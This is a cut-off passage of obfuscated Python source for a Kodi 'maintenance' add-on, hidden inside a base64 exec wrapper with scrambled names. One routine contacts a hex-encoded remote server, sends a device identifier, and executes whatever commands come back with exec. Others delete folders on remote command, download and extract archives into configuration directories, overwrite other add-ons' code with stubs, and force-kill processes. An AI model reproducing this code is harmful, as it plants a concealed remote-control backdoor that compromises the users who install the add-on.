import base64;exec base64.b64decode('import urllib , urllib2 , re , xbmcplugin , xbmcgui , xbmc , xbmcaddon , os , sys , time , xbmcvfs
import shutil , binascii , datetime
import downloader , extract
import time
import hashlib
from addon . common . addon import Addon
if 64 - 64: i11iIiiIii
######################################################
OO0o = 'plugin.program.tbs'
Oo0Ooo = 'Maintenance'
if 85 - 85: OOO0O0O0ooooo % IIii1I . II1 - O00ooooo00
I1IiiI = xbmcaddon . Addon ( id = OO0o )
zip = I1IiiI . getSetting ( 'zip' )
IIi1IiiiI1Ii = I1IiiI . getSetting ( 'localcopy' )
I11i11Ii = I1IiiI . getSetting ( 'private' )
oO00oOo = I1IiiI . getSetting ( 'reseller' )
OOOo0 = I1IiiI . getSetting ( 'openelec' )
Oooo000o = I1IiiI . getSetting ( 'resellerid' )
IiIi11iIIi1Ii = I1IiiI . getSetting ( 'favourites' )
Oo0O = I1IiiI . getSetting ( 'sources' )
IiI = I1IiiI . getSetting ( 'repositories' )
ooOo = I1IiiI . getSetting ( 'mastercopy' )
Oo = I1IiiI . getSetting ( 'username' ) . replace ( ' ' , '%20' )
o0O = I1IiiI . getSetting ( 'password' )
IiiIII111iI = I1IiiI . getSetting ( 'versionoverride' )
IiII = I1IiiI . getSetting ( 'login' )
iI1Ii11111iIi = I1IiiI . getSetting ( 'addonportal' )
i1i1II = I1IiiI . getSetting ( 'maintenance' )
O0oo0OO0 = I1IiiI . getSetting ( 'hardwareportal' )
I1i1iiI1 = I1IiiI . getSetting ( 'maintenance' )
iiIIIII1i1iI = I1IiiI . getSetting ( 'latestnews' )
o0oO0 = I1IiiI . getSetting ( 'tutorialportal' )
oo00 = I1IiiI . getSetting ( 'startupvideo' )
o00 = I1IiiI . getSetting ( 'startupvideopath' )
Oo0oO0ooo = I1IiiI . getSetting ( 'debug' )
o0oOoO00o = I1IiiI . getSetting ( 'wizardurl1' )
i1 = I1IiiI . getSetting ( 'wizardname1' )
oOOoo00O0O = I1IiiI . getSetting ( 'wizardurl2' )
i1111 = I1IiiI . getSetting ( 'wizardname2' )
i11 = I1IiiI . getSetting ( 'wizardurl3' )
I11 = I1IiiI . getSetting ( 'wizardname3' )
Oo0o0000o0o0 = I1IiiI . getSetting ( 'wizardurl4' )
oOo0oooo00o = I1IiiI . getSetting ( 'wizardname4' )
oO0o0o0ooO0oO = I1IiiI . getSetting ( 'wizardurl5' )
oo0o0O00 = I1IiiI . getSetting ( 'wizardname5' )
oO = I1IiiI . getSetting ( 'temp' )
i1iiIIiiI111 = xbmcgui . Dialog ( )
oooOOOOO = xbmcgui . DialogProgress ( )
i1iiIII111ii = xbmc . translatePath ( 'special://home/' )
i1iIIi1 = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
ii11iIi1I = xbmc . translatePath ( os . path . join ( i1iIIi1 , 'addon_data' ) )
iI111I11I1I1 = xbmc . translatePath ( os . path . join ( i1iIIi1 , 'playlists' ) )
OOooO0OOoo = xbmc . translatePath ( os . path . join ( i1iIIi1 , 'media' ) )
iIii1 = xbmc . translatePath ( os . path . join ( i1iIIi1 , 'Database' ) )
oOOoO0 = xbmc . translatePath ( os . path . join ( i1iIIi1 , 'Thumbnails' ) )
O0OoO000O0OO = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' , '' ) )
iiI1IiI = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , OO0o , 'default.py' ) )
II = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , OO0o , 'fanart.jpg' ) )
ooOoOoo0O = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , OO0o , 'resources' , 'addonxml' ) )
OooO0 = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , OO0o , 'resources' , 'settings.xml' ) )
II11iiii1Ii = xbmc . translatePath ( os . path . join ( i1iIIi1 , 'guisettings.xml' ) )
OO0oOoo = xbmc . translatePath ( os . path . join ( i1iIIi1 , 'guifix.xml' ) )
O0o0Oo = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , OO0o , 'icon_menu.png' ) )
Oo00OOOOO = xbmc . translatePath ( os . path . join ( i1iIIi1 , 'favourites.xml' ) )
O0O = xbmc . translatePath ( os . path . join ( i1iIIi1 , 'sources.xml' ) )
O00o0OO = xbmc . translatePath ( os . path . join ( i1iIIi1 , 'advancedsettings.xml' ) )
I11i1 = xbmc . translatePath ( os . path . join ( i1iIIi1 , 'profiles.xml' ) )
iIi1ii1I1 = xbmc . translatePath ( os . path . join ( i1iIIi1 , 'RssFeeds.xml' ) )
o0 = xbmc . translatePath ( os . path . join ( i1iIIi1 , 'keymaps' , 'keyboard.xml' ) )
I11II1i = xbmc . translatePath ( os . path . join ( zip ) )
IIIII = xbmc . translatePath ( os . path . join ( I11II1i , 'Community Builds' , '' ) )
ooooooO0oo = xbmc . translatePath ( os . path . join ( ii11iIi1I , OO0o , 'startup.xml' ) )
IIiiiiiiIi1I1 = xbmc . translatePath ( os . path . join ( ii11iIi1I , OO0o , 'temp.xml' ) )
I1IIIii = xbmc . translatePath ( os . path . join ( ii11iIi1I , OO0o , 'id.xml' ) )
oOoOooOo0o0 = xbmc . translatePath ( os . path . join ( ii11iIi1I , OO0o , 'progresstemp' ) )
OOOO = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , 'repository.totalrevolution' ) )
OOO00 = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , 'plugin.program.totalrevolution' ) )
iiiiiIIii = xbmc . translatePath ( os . path . join ( ii11iIi1I , OO0o , 'idtemp.xml' ) )
O000OO0 = xbmc . translatePath ( os . path . join ( ii11iIi1I , OO0o , 'temp' ) )
I11iii1Ii = xbmc . translatePath ( os . path . join ( ii11iIi1I , OO0o , 'successtxt.txt' ) )
I1IIiiIiii = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , OO0o , 'resources/' ) )
O000oo0O = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , OO0o , 'resources' , 'backup2' ) )
OOOOi11i1 = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , OO0o , 'checknews.py' ) )
IIIii1II1II = os . path . join ( O0OoO000O0OO , OO0o , 'resources' , 'tmr' )
i1I1iI = xbmc . getSkinDir ( )
oo0OooOOo0 = xbmc . translatePath ( 'special://logpath/' )
o0OO00oO = '/storage/backup'
I11i1I1I = '/storage/.restore/'
oO0Oo = xbmc . translatePath ( os . path . join ( ii11iIi1I , OO0o ) )
oOOoo0Oo = xbmc . translatePath ( os . path . join ( oO0Oo , 'guinew.xml' ) )
o00OO00OoO = xbmc . translatePath ( os . path . join ( oO0Oo , 'guitemp' , '' ) )
OOOO0OOoO0O0 = xbmc . translatePath ( os . path . join ( I11II1i , 'Database' ) )
O0Oo000ooO00 = os . path . join ( O0OoO000O0OO , 'packages' )
oO0 = os . path . join ( i1iiIII111ii , 'addontemp' )
Ii1iIiII1ii1 = xbmc . translatePath ( os . path . join ( i1iIIi1 , '.cbcfg' ) )
ooOooo000oOO = 'Venztech'
Oo0oOOo = 'http://urlshortbot.com/venztech'
Oo0OoO00oOO0o = [ 'firstrun' , 'plugin.program.tbs' , 'plugin.program.totalinstaller' , 'script.module.addon.common' , 'addons' , 'addon_data' , 'userdata' , 'sources.xml' , 'favourites.xml' ]
OOO00O = '0'
OOoOO0oo0ooO = [ '/storage/.kodi' , '/storage/.cache' , '/storage/.config' , '/storage/.ssh' ]
O0o0O00Oo0o0 = '1889903'
O00O0oOO00O00 = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.program.tbs/addon.xml' ) )
i1Oo00 = xbmc . translatePath ( 'special://home/userdata/firstrun/' )
i1i = os . path . join ( ii11iIi1I , OO0o , 'cfg' )
iiI111I1iIiI = I1IiiI . getSetting ( 'resellername' )
IIIi1I1IIii1II = I1IiiI . getSetting ( 'internetcheck' )
O0 = I1IiiI . getSetting ( 'cbnotifycheck' )
ii1ii1ii = I1IiiI . getSetting ( 'mynotifycheck' )
oooooOoo0ooo = xbmc . translatePath ( os . path . join ( ii11iIi1I , OO0o , '' ) )
I1I1IiI1 = xbmc . getInfoLabel ( "System.BuildVersion" )
if 5 - 5: ooOO0O0ooOooO * IIIi11I1 - iIII % Ii1i1i . IIIIiiII111
if 97 - 97: ooo0O0O00 + Oo00oo0oO * OoOo0o . i11Iii
if 16 - 16: IIi1iIi % IIooooo % o0O00o . o0O0Oooo0O
def O0o ( ) :
 I1I1IiI1 = xbmc . getInfoLabel ( "System.BuildVersion" )
 OoOooO = float ( I1I1IiI1 [ : 4 ] )
 if OoOooO < 14 :
  II111iiiI1Ii = os . path . join ( oo0OooOOo0 , 'xbmc.log' )
 else :
  II111iiiI1Ii = os . path . join ( oo0OooOOo0 , 'kodi.log' )
  if 78 - 78: oOOO0OooOoooO % ii11IIII11I / o0O00o
 try :
  oooo0O0 = open ( II111iiiI1Ii , mode = 'r' )
  oOOO = oooo0O0 . read ( )
  oooo0O0 . close ( )
 except :
  try :
   oooo0O0 = open ( os . path . join ( i1iiIII111ii , 'temp' , 'kodi.log' ) , mode = 'r' )
   oOOO = oooo0O0 . read ( )
   oooo0O0 . close ( )
  except :
   try :
    oooo0O0 = open ( os . path . join ( i1iiIII111ii , 'temp' , 'xbmc.log' ) , mode = 'r' )
    oOOO = oooo0O0 . read ( )
    oooo0O0 . close ( )
   except :
    pass
    if 16 - 16: Ii1i1i / Oo00oo0oO + IIooooo
 if 'OpenELEC' in oOOO :
  return True
  if 65 - 65: OOO0O0O0ooooo
  if 68 - 68: i11Iii % oOOO0OooOoooO
if O0o ( ) :
 ooO00OO0 = '/storage/.config/'
elif not O0o ( ) :
 ooO00OO0 = os . path . join ( i1iiIII111ii , binascii . unhexlify ( '2e636f6e666967' ) )
 if 31 - 31: o0O00o % o0O00o % IIi1iIi
OOOOoo0Oo = os . path . join ( ooO00OO0 , binascii . unhexlify ( '74732e68' ) )
if 14 - 14: o0O00o
if not os . path . exists ( ooO00OO0 ) :
 os . makedirs ( ooO00OO0 )
 if 11 - 11: o0O0Oooo0O * IIIi11I1 . IIii1I % II1 + o0O00o
 if 78 - 78: Ii1i1i . i11Iii + Ii1i1i / IIi1iIi / Ii1i1i
def oO0O00OoOO0 ( _in , _out ) :
 try :
  OoO = zipfile . ZipFile ( _in , 'r' )
  OoO . extractall ( _out )
  if 88 - 88: o0O00o . ooOO0O0ooOooO * ooOO0O0ooOooO % oOOO0OooOoooO
 except Exception , iiIIiiIi1Ii11 :
  print str ( iiIIiiIi1Ii11 )
  return False
  if 65 - 65: ooOO0O0ooOooO . i11Iii % IIi1iIi . i11iIiiIii + OOO0O0O0ooooo
 return True
 if 26 - 26: IIi1iIi - IIii1I - IIIi11I1 / Ii1i1i . IIIIiiII111 % IIii1I
 if 91 - 91: ooo0O0O00 . IIii1I / OoOo0o + O00ooooo00
def I1i ( _in , _out , dp ) :
 OoO = zipfile . ZipFile ( _in , 'r' )
 OOOOO0oo0O0O0 = float ( len ( OoO . infolist ( ) ) )
 oOoO0O0o0Oooo = 0
 if 5 - 5: ii11IIII11I - ooOO0O0ooOooO - II1 % IIooooo + IIIi11I1 * IIii1I
 try :
  if 37 - 37: o0O0Oooo0O % ii11IIII11I + IIIIiiII111 + ooo0O0O00 * IIi1iIi % OOO0O0O0ooooo
  for OooOoOO0 in OoO . infolist ( ) :
   oOoO0O0o0Oooo += 1
   iI1i11iII111 = oOoO0O0o0Oooo / OOOOO0oo0O0O0 * 100
   dp . update ( int ( iI1i11iII111 ) )
   OoO . extract ( OooOoOO0 , _out )
   if 15 - 15: i11iIiiIii % IIooooo . iIII + Oo00oo0oO
 except Exception , iiIIiiIi1Ii11 :
  print str ( iiIIiiIi1Ii11 )
  return False
  if 61 - 61: iIII * Oo00oo0oO % iIII - O00ooooo00 - IIii1I
 return True
 if 74 - 74: Oo00oo0oO + ooOO0O0ooOooO / Ii1i1i
 if 100 - 100: IIIIiiII111 * IIii1I
def oOo00oOoO000 ( ) :
 OOooo0oOO0O = 'defaultskindependecycheck'
 if os . path . exists ( oO0 ) :
  shutil . rmtree ( oO0 )
  if 62 - 62: IIIi11I1
 if not os . path . exists ( oO0 ) :
  os . makedirs ( oO0 )
  if 100 - 100: IIooooo - OOO0O0O0ooooo % OoOo0o * i11Iii + IIIi11I1
  if 88 - 88: II1 - Ii1i1i * OOO0O0O0ooooo * II1 . II1
  if 33 - 33: oOOO0OooOoooO + o0O00o * OoOo0o / IIii1I - IIIi11I1
 if i1I1iI != 'skin.confluence' :
  O0oO = os . path . join ( O0OoO000O0OO , i1I1iI , 'addon.xml' )
  OO0ooOOO0OOO = open ( O0oO , mode = 'r' )
  oO00oooOOoOo0 = OO0ooOOO0OOO . read ( )
  OO0ooOOO0OOO . close ( )
  if 74 - 74: IIii1I * Oo00oo0oO + IIIIiiII111 / O00ooooo00 / ooOO0O0ooOooO . iIII
  oooOo0OOOoo0 = re . compile ( '<requires[\s\S]*?\/requires' ) . findall ( oO00oooOOoOo0 )
  OOooo0oOO0O = oooOo0OOOoo0 [ 0 ] if ( len ( oooOo0OOOoo0 ) > 0 ) else 'None'
  if 51 - 51: iIII / IIIIiiII111 . i11Iii * ooo0O0O00 + Ii1i1i * o0O0Oooo0O
 OOOoOo = O00o0 ( 'http://totalxbmc.com/TI/AddonPortal/approved.php' )
 if 40 - 40: oOOO0OooOoooO + II1 % ooo0O0O00 - IIii1I . IIIi11I1
 oooOOOOO . create ( 'Backing Up Add-ons' , '' , 'Please Wait...' )
 if 48 - 48: ooo0O0O00 - OoOo0o / II1
 for OO0O0 in os . listdir ( O0OoO000O0OO ) :
  if 30 - 30: i11Iii + Oo00oo0oO * IIi1iIi % i11iIiiIii % IIIIiiII111
  if 97 - 97: Oo00oo0oO % Oo00oo0oO % OoOo0o / o0O00o - IIii1I
  if not 'totalinstaller' in OO0O0 and not 'plugin.program.tbs' in OO0O0 and not 'packages' in OO0O0 and not 'repo.' in OO0O0 and not 'repository' in OO0O0 and os . path . isdir ( os . path . join ( O0OoO000O0OO , OO0O0 ) ) :
   if 69 - 69: oOOO0OooOoooO
   if 11 - 11: IIIi11I1
   if OO0O0 in OOOoOo and not OO0O0 in OOooo0oOO0O and not 'script.skin' in OO0O0 and not 'script.common.plugin' in OO0O0 and not 'script.module' in OO0O0 and os . path . isdir ( os . path . join ( O0OoO000O0OO , OO0O0 ) ) :
    if 16 - 16: IIooooo + o0O0Oooo0O * OOO0O0O0ooooo % O00ooooo00 . IIIi11I1
    if 67 - 67: II1 / IIIi11I1 * IIooooo + IIi1iIi
    if not 'service.xbmc.versioncheck' in OO0O0 and not 'packages' in OO0O0 and os . path . isdir ( os . path . join ( O0OoO000O0OO , OO0O0 ) ) :
     if 65 - 65: II1 - Oo00oo0oO / ii11IIII11I / ooOO0O0ooOooO / O00ooooo00
     try :
      oooOOOOO . update ( 0 , "Backing Up" , '[COLOR darkcyan]%s[/COLOR]' % OO0O0 , 'Please Wait...' )
      os . makedirs ( os . path . join ( oO0 , OO0O0 ) )
      if 71 - 71: oOOO0OooOoooO + IIooooo
      iI1111ii1I = os . path . join ( oO0 , OO0O0 , 'addon.xml' )
      iiI11iI = os . path . join ( oO0 , OO0O0 , 'default.py' )
      oOOoO0o0oO = open ( os . path . join ( O0OoO000O0OO , OO0O0 , 'addon.xml' ) , mode = 'r' )
      oOOO = oOOoO0o0oO . read ( )
      oOOoO0o0oO . close ( )
      if 93 - 93: o0O0Oooo0O * II1 + ii11IIII11I
      IiII111i1i11 = re . compile ( ' name="(.+?)"' ) . findall ( oOOO )
      i111iIi1i1II1 = re . compile ( 'provider-name="(.+?)"' ) . findall ( oOOO )
      oooO = re . compile ( '<addon[\s\S]*?">' ) . findall ( oOOO )
      i1I1i111Ii = re . compile ( '<description[\s\S]*?<\/description>' ) . findall ( oOOO )
      ooo = IiII111i1i11 [ 0 ] if ( len ( IiII111i1i11 ) > 0 ) else 'None'
      i1i1iI1iiiI = i111iIi1i1II1 [ 0 ] if ( len ( i111iIi1i1II1 ) > 0 ) else 'Anonymous'
      Ooo0oOooo0 = oooO [ 0 ] if ( len ( oooO ) > 0 ) else 'None'
      oOOOoo00 = i1I1i111Ii [ 0 ] if ( len ( i1I1i111Ii ) > 0 ) else 'None'
      if 9 - 9: OOO0O0O0ooooo % OOO0O0O0ooooo - ooo0O0O00
      OoOiiI1IIIi = '<addon id="' + OO0O0 + '" name="' + ooo + '" version="0" provider-name="' + i1i1iI1iiiI + '">'
      II11IiIi11 = '<description>If you\'re seeing this message it means the add-on is still updating, please wait for the update process to complete.</description>'
      if 7 - 7: Ii1i1i . IIooooo % OoOo0o * ii11IIII11I + o0O0Oooo0O + oOOO0OooOoooO
      if Ooo0oOooo0 != 'None' :
       IIIIiII1i = oOOO . replace ( oOOOoo00 , II11IiIi11 ) . replace ( Ooo0oOooo0 , OoOiiI1IIIi )
       if 1 - 1: ooOO0O0ooOooO
      else :
       IIIIiII1i = oOOO . replace ( oOOOoo00 , II11IiIi11 )
       if 68 - 68: o0O00o - IIIi11I1 / oOOO0OooOoooO / IIi1iIi
      I11iiii = open ( iI1111ii1I , mode = 'w+' )
      I11iiii . write ( str ( IIIIiII1i ) )
      I11iiii . close ( )
      O0i1iI = open ( iiI11iI , mode = 'w+' )
      O0i1iI . write ( 'import xbmcplugin,xbmcgui,xbmc,xbmcaddon,os,sys\nAddonID="' + OO0O0 + '"\nAddonName="' + ooo + '"\ndialog=xbmcgui.Dialog()\nxbmc.executebuiltin("UpdateLocalAddons")\nxbmc.executebuiltin("UpdateAddonRepos")\nchoice=dialog.yesno(AddonName+" Add-on Requires Update","This add-on may still be in the process of the updating, would you like check the status of your add-on updates or try re-installing via the Total Installer backup method? We highly recommend checking for updates.",yeslabel="Install Option 2", nolabel="Check Updates")\nif choice==0: xbmc.executebuiltin(\'ActivateWindow(10040,"addons://outdated/",return)\')\nelse: xbmc.executebuiltin(\'ActivateWindow(10001,"plugin://plugin.program.tbs/?mode=grab_addons&url=%26redirect%26addonid%3d\'+AddonID+\'")\')\nxbmcplugin.endOfDirectory(int(sys.argv[1]))' )
      O0i1iI . close ( )
      if 29 - 29: IIIi11I1 % i11Iii - IIIi11I1 / i11Iii . O00ooooo00
     except :
      pass
      if 31 - 31: oOOO0OooOoooO
      if 88 - 88: Ii1i1i - ii11IIII11I + i11Iii * IIIi11I1 % IIii1I + iIII
   else :
    shutil . copytree ( os . path . join ( O0OoO000O0OO , OO0O0 ) , os . path . join ( oO0 , OO0O0 ) )
    if 76 - 76: IIIi11I1 * o0O00o % oOOO0OooOoooO
 oooOOOOO . close ( )
 if 57 - 57: IIii1I - O00ooooo00 / oOOO0OooOoooO - OOO0O0O0ooooo * II1 % ooOO0O0ooOooO
 Oo00OO0o0o00 = "Creating Backup"
 IiIi1I1 = "Archiving..."
 IiIIi1 = ""
 IIIIiii1IIii = "Please Wait"
 if 38 - 38: i11Iii + ooOO0O0ooOooO % ii11IIII11I % IIIIiiII111 - IIooooo / II1
 Archive_Tree ( oO0 , Ii1iIiII1ii1 , Oo00OO0o0o00 , IiIi1I1 , IiIIi1 , IIIIiii1IIii , '' , '' )
 if 73 - 73: ooo0O0O00 * OOO0O0O0ooooo - i11iIiiIii
 try :
  shutil . rmtree ( oO0 )
  if 85 - 85: IIooooo % o0O00o + IIi1iIi / ooo0O0O00 . OoOo0o + i11Iii
 except :
  pass
  if 62 - 62: i11iIiiIii + i11iIiiIii - ooo0O0O00
  if 28 - 28: o0O00o . o0O00o % IIii1I * IIii1I . ooo0O0O00 / o0O00o
def iII1i1 ( url ) :
 O0oOOoooOO0O = xbmc . Player ( ) . isPlaying ( )
 if O0oOOoooOO0O == 0 :
  ooo00Ooo = Oo0o0O00 ( )
  ii1 = 0
  if 39 - 39: IIooooo / ii11IIII11I . ooo0O0O00 % OOO0O0O0ooooo * o0O00o + IIIi11I1
  while ii1 != 1 :
   if 77 - 77: IIooooo + ooOO0O0ooOooO . IIIIiiII111 * oOOO0OooOoooO + i11Iii + i11Iii
   try :
    if Oo0oO0ooo == 'true' :
     print "### URL: " + binascii . unhexlify ( '687474703a2f2f746c62622e6d652f636f6d6d2e7068703f783d' ) + I1ii1I1iiii ( 'e' , ooo00Ooo )
    iiI = oOIIiIi ( url + I1ii1I1iiii ( 'e' , ooo00Ooo ) )
    if iiI != '' and not 'sleep' in iiI :
     iiI = I1ii1I1iiii ( 'd' , iiI ) . replace ( '\n' , ';' )
    if Oo0oO0ooo == 'true' :
     try :
      print "### Return: " + iiI
     except :
      pass
      if 91 - 91: Oo00oo0oO * iIII / IIIi11I1 . OOO0O0O0ooooo + Ii1i1i + IIIIiiII111
    if iiI == '' :
     if Oo0oO0ooo == 'true' :
      print "### Blank page returned"
      if 8 - 8: OoOo0o / Oo00oo0oO
      if 20 - 20: IIIi11I1
    if not '<body' in iiI and iiI != '' :
     o0oO000oo = re . compile ( 'com(.+?)="' ) . findall ( iiI )
     o00o0 = o0oO000oo [ 0 ] if ( len ( o0oO000oo ) > 0 ) else ''
     II1I = re . compile ( '="(.+?)endcom"' ) . findall ( iiI )
     II1I1I1Ii = II1I [ 0 ] if ( len ( II1I ) > 0 ) else 'End'
     if 70 - 70: Ii1i1i % OoOo0o + i11Iii / IIooooo % OOO0O0O0ooooo
     oO00O0 = re . compile ( '<favourite[\s\S]*?</favourite>' ) . findall ( II1I1I1Ii )
     IIi1IIIi = oO00O0 [ 0 ] if ( len ( oO00O0 ) > 0 ) else 'None'
     if 99 - 99: IIooooo + Ii1i1i * ooOO0O0ooOooO . ooo0O0O00 - Oo00oo0oO
     if Oo0oO0ooo == 'true' :
      if 58 - 58: IIooooo + ooo0O0O00 - IIIi11I1
      print "### command: " + II1I1I1Ii
      print "### SF_command: " + IIi1IIIi
      if 3 - 3: Ii1i1i
     oOIIiIi ( binascii . unhexlify ( '687474703a2f2f746c62622e6d652f636f6d6d2e7068703f783d' ) + I1ii1I1iiii ( 'e' , ooo00Ooo ) + '&y=' + o00o0 )
     if 97 - 97: oOOO0OooOoooO
     if Oo0oO0ooo == 'true' :
      print "### COMMAND: " + II1I1I1Ii
      print "### LINK: " + iiI
     if IIi1IIIi != 'None' :
      oooo0O0 = open ( oOoOooOo0o0 , mode = 'w+' )
      oooo0O0 . write ( IIi1IIIi )
      oooo0O0 . close ( )
      if 15 - 15: O00ooooo00 + IIIIiiII111
     elif II1I1I1Ii != 'End' and not 'sleep' in iiI :
      if ';' in II1I1I1Ii :
       iii1i1I1i1 = II1I1I1Ii . split ( ';' )
       for OooOoOO0 in iii1i1I1i1 :
        if Oo0oO0ooo == 'true' :
         print "### command: " + OooOoOO0
        exec OooOoOO0
        xbmc . sleep ( 500 )
        while xbmc . Player ( ) . isPlaying ( ) :
         xbmc . sleep ( 500 )
      else :
       exec II1I1I1Ii
       xbmc . sleep ( 500 )
       while xbmc . Player ( ) . isPlaying ( ) :
        xbmc . sleep ( 500 )
       if os . path . exists ( oOoOooOo0o0 ) :
        os . remove ( oOoOooOo0o0 )
        if 25 - 25: Oo00oo0oO . ii11IIII11I
     elif II1I1I1Ii == 'End' :
      if 'sleep' in iiI :
       iIIi = open ( IIIii1II1II , 'r' )
       oOOO = iIIi . read ( )
       iIIi . close ( )
       oO0o00oo0 = str ( iiI [ 6 : ] )
       if Oo0oO0ooo == 'true' :
        print "### Sleep: " + oO0o00oo0
       if str ( oO0o00oo0 ) != str ( oOOO ) :
        I11iiii = open ( IIIii1II1II , 'w+' )
        I11iiii . write ( oO0o00oo0 )
        I11iiii . close ( )
        if Oo0oO0ooo == 'true' :
         print "### Changed timer to " + oO0o00oo0
        xbmc . executebuiltin ( 'StopScript(special://home/addons/plugin.program.tbs/service.py)' )
        xbmc . executebuiltin ( 'RunScript(special://home/addons/plugin.program.tbs/service.py)' )
       else :
        if Oo0oO0ooo == 'true' :
         print "### Timer same, no changes required"
      xbmc . executebuiltin ( 'UpdateLocalAddons' )
      xbmc . executebuiltin ( 'UpdateAddonRepos' )
      ii1 = 1
   except :
    print "### Failed with update"
    if 19 - 19: ooOO0O0ooOooO + o0O0Oooo0O
    if 53 - 53: OoOo0o - IIIi11I1 - OoOo0o * o0O00o
def oooooo0OO ( command , repo_link , repo_id ) :
 iI1I = os . path . join ( O0Oo000ooO00 , 'updates.zip' )
 if not os . path . exists ( O0Oo000ooO00 ) :
  os . makedirs ( O0Oo000ooO00 )
  if 100 - 100: IIii1I + IIIIiiII111 / iIII . i11iIiiIii
 if command == 'delete' :
  shutil . rmtree ( xbmc . translatePath ( repo_link ) )
  III1I1Iii1iiI ( )
  if 17 - 17: IIooooo % IIii1I - IIii1I
 if command == 'addons' or command == 'ADDON_DATA' or command == 'media' or command == 'config' or command == 'playlists' or command == 'custom' :
  if 78 - 78: o0O00o + IIi1iIi . ii11IIII11I - o0O00o . IIooooo
  if not os . path . exists ( os . path . join ( O0OoO000O0OO , repo_id ) ) or repo_id == '' :
   try :
    downloader . download ( repo_link , iI1I )
   except :
    pass
  if ( command == "addons" and not os . path . exists ( os . path . join ( O0OoO000O0OO , repo_id ) ) ) or ( command == 'addons' and repo_id == '' ) :
   try :
    extract . all ( iI1I , O0OoO000O0OO )
    III1I1Iii1iiI ( )
   except :
    pass
    if 30 - 30: IIIi11I1 + Ii1i1i % IIooooo * o0O00o / iIII - IIi1iIi
  if command == 'ADDON_DATA' :
   try :
    extract . all ( iI1I , ii11iIi1I )
   except :
    print "### FAILED TO EXTRACT TO " + ii11iIi1I
    if 64 - 64: IIii1I
  if command == 'media' :
   try :
    extract . all ( iI1I , OOooO0OOoo )
   except :
    pass
    if 21 - 21: iIII . ooOO0O0ooOooO
  if command == 'config' :
   try :
    extract . all ( iI1I , ooO00OO0 )
   except :
    pass
    if 54 - 54: ooOO0O0ooOooO % ooOO0O0ooOooO
  if command == 'playlists' :
   try :
    extract . all ( iI1I , iI111I11I1I1 )
   except :
    pass
    if 86 - 86: OOO0O0O0ooooo % IIooooo * ii11IIII11I * IIii1I * O00ooooo00 * IIi1iIi
  if command == 'custom' :
   try :
    extract . all ( iI1I , repo_id )
   except :
    print "### Failed to extract update " + repo_link
    if 83 - 83: IIIIiiII111 % ooOO0O0ooOooO - IIIIiiII111 + o0O0Oooo0O - OOO0O0O0ooooo
 if os . path . exists ( iI1I ) :
  try :
   os . remove ( iI1I )
  except :
   pass
   if 52 - 52: iIII * ii11IIII11I
def i11IIIiIiIi ( ) :
 if 27 - 27: Oo00oo0oO + IIIIiiII111 - i11Iii + OOO0O0O0ooooo . IIooooo
 if not os . path . exists ( scriptfolder ) :
  os . makedirs ( scriptfolder )
 I1I1IiI1 = xbmc . getInfoLabel ( "System.BuildVersion" )
 OoOooO = float ( I1I1IiI1 [ : 4 ] )
 if xbmc . getCondVisibility ( 'system.platform.windows' ) :
  if OoOooO < 14 :
   try :
    I11iiii = open ( os . path . join ( scriptfolder , 'win_xbmc.bat' ) , 'w+' )
    I11iiii . write ( '@ECHO off\nTASKKILL /im XBMC.exe /f\ntskill XBMC.exe\nXBMC.exe' )
    I11iiii . close ( )
    os . system ( os . path . join ( scriptfolder , 'win_xbmc.bat' ) )
   except :
    print "### Failed to run win_xbmc.bat"
  else :
   try :
    I11iiii = open ( os . path . join ( scriptfolder , 'win_kodi.bat' ) , 'w+' )
    I11iiii . write ( '@ECHO off\nTASKKILL /im Kodi.exe /f\ntskill Kodi.exe\nKodi.exe' )
    I11iiii . close ( )
    os . system ( os . path . join ( scriptfolder , 'win_kodi.bat' ) )
   except :
    print "### Failed to run win_kodi.bat"
 elif xbmc . getCondVisibility ( 'system.platform.osx' ) :
  if OoOooO < 14 :
   try :
    I11iiii = open ( os . path . join ( scriptfolder , 'osx_xbmc.sh' ) , 'w+' )
    I11iiii . write ( 'killall -9 XBMC\nXBMC' )
    I11iiii . close ( )
   except :
    pass
   try :
    os . system ( 'chmod 755 ' + os . path . join ( scriptfolder , 'osx_xbmc.sh' ) )
   except :
    pass
   try :
    os . system ( os . path . join ( scriptfolder , 'osx_xbmc.sh' ) )
   except :
    print "### Failed to run osx_xbmc.sh"
  else :
   try :
    I11iiii = open ( os . path . join ( scriptfolder , 'osx_kodi.sh' ) , 'w+' )
    I11iiii . write ( 'killall -9 Kodi\nKodi' )
    I11iiii . close ( )
   except :
    pass
   try :
    os . system ( 'chmod 755 ' + os . path . join ( scriptfolder , 'osx_kodi.sh' ) )
   except :
    pass
   try :
    os . system ( os . path . join ( scriptfolder , 'osx_kodi.sh' ) )
   except :
    print "### Failed to run osx_kodi.sh"
    if 46 - 46: o0O0Oooo0O
 elif xbmc . getCondVisibility ( 'system.platform.android' ) :
  if os . path . exists ( '/data/data/com.rechild.advancedtaskkiller' ) :
   i1iiIIiiI111 . ok ( 'Attempting to force close' , 'On the following screen please press the big button at the top which says "KILL selected apps". Kodi will restart, please be patient while your system updates the necessary files and your skin will automatically switch once fully updated.' )
   try :
    xbmc . executebuiltin ( 'StartAndroidActivity(com.rechild.advancedtaskkiller)' )
   except :
    print "### Failed to run Advanced Task Killer. Make sure you have it installed, you can download from https://archive.org/download/com.rechild.advancedtaskkiller/com.rechild.advancedtaskkiller.apk"
  else :
   i1iiIIiiI111 . ok ( 'Advanced Task Killer Not Found' , "The Advanced Task Killer app cannot be found on this system. Please make sure you actually installed it after downloading. We can't do everything for you - on Android you do have to physically click on the download to install an app." )
  try :
   os . system ( 'adb shell am force-stop org.xbmc.kodi' )
  except :
   pass
  try :
   os . system ( 'adb shell am force-stop org.kodi' )
  except :
   pass
  try :
   os . system ( 'adb shell am force-stop org.xbmc.xbmc' )
  except :
   pass
  try :
   os . system ( 'adb shell am force-stop org.xbmc' )
  except :
   pass
  try :
   os . system ( 'adb shell kill org.xbmc.kodi' )
  except :
   pass
  try :
